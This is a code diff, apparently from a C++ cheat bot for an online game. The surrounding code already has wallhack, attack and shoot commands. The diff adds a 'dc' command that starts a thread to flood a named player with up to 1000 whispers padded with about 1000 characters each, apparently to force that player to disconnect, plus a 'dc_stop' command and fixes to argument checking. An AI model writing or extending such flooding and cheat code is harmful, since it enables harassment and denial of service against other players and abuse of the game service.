@@ -130,6 +130,27 @@ void Command::set_wallhack(bool enabled){
 	print(string("Set wallhack ") + (enabled ? "on." : "off."));
 }
 
+void Command::_disconnect() {
+	int i = 0;
+	while (instance->disconnecting && i < 1000) {
+		cout << "[BOT] Sending msg " << i << " to " << instance->username_dc << endl;
+		CG_Whisper p(instance->username_dc, to_string(i) + string(1000, 'a') + to_string(i));
+		p.send();
+		//Sleep(1);
+		i++;
+	}
+	instance->disconnecting = false;
+}
+
+void Command::disconnect(const string& username){
+	instance->username_dc = username;
+	if (!instance->disconnecting){
+		instance->disconnecting = true;
+		CreateThread(0, 0, (LPTHREAD_START_ROUTINE)_disconnect, 0, 0, 0);
+	}
+}
+
+
 void Command::run(const string& _cmd){
 	bool check = true;
 	vector<string> cmd = split(_cmd, ' ');
@@ -155,15 +176,15 @@ void Command::run(const string& _cmd){
 			attack(cmd[1] == "start" ? true : false);
 	
 	} else if (cmd[0] == "msg"){
-		if (check_n_args(2, cmd))
+		if (check = check_n_args(2, cmd))
 			msg(stoi(cmd[1]), cmd[2]);
 
 	} else if (cmd[0] == "send"){
-		if (check_n_args(1, cmd))
+		if (check = check_n_args(1, cmd))
 			send(cmd[1]);
 
 	} else if (cmd[0] == "wallhack"){
-		if (check_n_args(1, cmd))
+		if (check = check_n_args(1, cmd))
 			set_wallhack((bool)stoi(cmd[1]));
 
 	} else if (cmd[0] == "shoot"){
@@ -177,7 +198,14 @@ void Command::run(const string& _cmd){
 		p1.send();
 		p2.send();
 
-	} else print_err("Unknown command");
+	} else if (cmd[0] == "dc"){
+		if (check = check_n_args(1, cmd))
+			disconnect(cmd[1]);
+
+	} else if (cmd[0] == "dc_stop"){
+		instance->disconnecting = false;
+
+	} else print_err("Unknown command: " + cmd[0]);
 
 	if (!check)
 		print_err("Bad arguments!");
